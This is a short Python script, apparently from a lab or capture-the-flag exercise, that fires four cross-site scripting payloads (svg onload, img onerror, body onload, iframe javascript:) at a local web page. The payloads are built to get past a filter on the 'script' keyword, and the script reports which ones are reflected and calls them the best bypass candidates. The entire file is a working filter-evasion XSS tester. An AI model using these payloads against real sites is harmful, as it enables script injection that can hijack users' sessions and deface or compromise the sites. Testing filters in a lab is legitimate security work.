import urllib.parse
import requests

base_url = "http://127.0.0.1:33084/page"

# Define payloads (alternative XSS without using 'script' keyword)
payloads = {
    "svg_onload": "<svg onload=alert('XSS')>",
    "img_onerror": "<img src=x onerror=alert('XSS')>",
    "body_onload": "<body onload=alert('XSS')>",
    "iframe_javascript": "<iframe src=javascript:alert('XSS')>"
}

print("=== Alternative XSS Payloads (bypassing 'script' filter) ===\n")

for name, payload in payloads.items():
    # URL encode for GET parameter
    url_encoded = urllib.parse.quote(payload, safe='')
    full_test_url = f"{base_url}?name={url_encoded}"
    
    print(f"[+] Payload: {name}")
    print(f"[+] Raw HTML: {payload}")
    print(f"[+] URL Encoded: {url_encoded}")
    print(f"[+] Full Test URL: {full_test_url}")
    
    # Test the payload
    try:
        response = requests.get(full_test_url, timeout=10)
        print(f"[+] Status Code: {response.status_code}")
        print(f"[+] Response Length: {len(response.text)} bytes")
        
        # Check if payload is reflected in response
        if payload in response.text:
            print(f"[✓] Payload reflected in response")
        elif url_encoded in response.url:
            print(f"[✓] Payload appears in URL (may execute on page load)")
        else:
            print(f"[-] Payload not found in response (may be sanitized)")
        
        # Print response snippet if payload found
        if payload in response.text:
            idx = response.text.find(payload)
            snippet = response.text[max(0, idx-100):idx+len(payload)+100]
            print(f"[+] Response Snippet:\n{snippet}\n")
        else:
            print()
            
    except Exception as e:
        print(f"[-] Error testing payload: {e}\n")

print("=== Test Summary ===")
print("These payloads use alternative HTML tags and event handlers to bypass")
print("'script' keyword filters while still executing JavaScript.")
print("\nBest candidates for XSS without <script> tags:")
print("- <svg onload=...> - Works in most modern browsers")
print("- <img src=x onerror=...> - Classic bypass, very reliable")
print("- <body onload=...> - Requires body tag context")
print("- <iframe src=javascript:...> - Uses javascript: protocol")
